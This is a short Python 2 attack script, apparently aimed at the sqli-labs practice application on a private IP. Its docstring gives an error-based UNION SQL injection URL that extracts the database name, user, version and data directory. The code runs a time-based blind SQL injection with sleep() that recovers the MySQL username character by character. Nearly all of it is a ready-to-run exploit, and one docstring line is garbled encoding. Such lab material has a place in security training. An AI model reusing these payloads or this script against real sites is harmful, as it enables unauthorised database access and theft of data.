#!/usr/bin/env python
#encoding=utf-8

'''
GET -Error based - Single quotes -String
Œﬁªÿœ‘Œª
http://192.168.1.111/Less-1/?id=1' and 1=2+union+select+1,2,3+from+(select+count(*),concat(floor(rand(0)*2),(select+concat(0x3a,database(),0x3a,user(),0x3a,version(),0x3a,@@datadir)))a+from+information_schema.tables+group+by+a)b%23
'''

import httplib, time, string, sys, random

headers = {}

# payloads
payloads = list(string.ascii_letters) + list(string.digits) + ['@', '_', '.']

# target
host = '192.168.1.111'

print 'Start to retrive MySQL User:'

user = ''

for i in range (1, 30):
    for payload in payloads:
        try:
            conn = httplib.HTTPConnection(host, timeout=3)
            conn.request(method='GET',
                            url = "/Less-1/?id=1'XOR(if(ascii(mid(user(), %s, 1))=%s, sleep(4), 0))OR'aa" % (i, ord(payload)),
                            headers = headers
            )
            start_time = time.time()
            conn.getresponse()
            conn.close()
        except:
            user += payload
            sys.stdout.write('\r[In Progress]' + user)
            sys.stdout.flush()
            print
            break

print '\n[Done] MySQL user is ' + user
